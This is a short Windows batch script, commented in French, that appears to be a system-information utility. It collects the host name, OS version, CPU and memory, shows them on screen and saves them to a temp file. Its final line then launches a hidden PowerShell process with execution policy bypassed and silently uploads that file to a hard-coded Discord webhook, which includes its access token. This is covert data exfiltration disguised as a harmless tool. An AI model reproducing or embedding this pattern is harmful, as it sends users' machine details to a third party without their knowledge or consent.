@echo off

:: Récupérer le nom de l'hôte
set hostName=%COMPUTERNAME%

:: Récupérer le système d'exploitation
for /F "delims=" %%i in ('wmic os get caption ^| findstr /r "."') do set osInfo=%%i

:: Récupérer la version du noyau
for /F "delims=" %%i in ('wmic os get version ^| findstr /r "."') do set kernelVersion=%%i

:: Récupérer les informations sur le processeur
for /F "delims=" %%i in ('wmic cpu get name ^| findstr /r "."') do set cpuInfo=%%i

:: Récupérer la quantité de mémoire RAM disponible
for /F "delims=" %%i in ('wmic computersystem get totalphysicalmemory ^| findstr /r "."') do set ramInfo=%%i

:: Afficher les informations récupérées
echo Informations système pour %hostName%
echo Système d'exploitation  %osInfo%
echo Version du noyau  %kernelVersion%
echo Processeur  %cpuInfo%
echo Mémoire RAM (en Go)  %ramInfo%

:: Enregistrer les informations dans un fichier texte
echo Informations système pour %hostName% > "%temp%\system_info.txt"
echo Système d'exploitation  %osInfo% >> "%temp%\system_info.txt"
echo Version du noyau  %kernelVersion% >> "%temp%\system_info.txt"
echo Processeur  %cpuInfo% >> "%temp%\system_info.txt"
echo Mémoire RAM (en Go)  %ramInfo% >> "%temp%\system_info.txt"

powershell -NoP -NonI -W Hidden -Exec Bypass "(New-Object System.Net.WebClient).UploadFile('https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF', '%temp%\system_info.txt')"
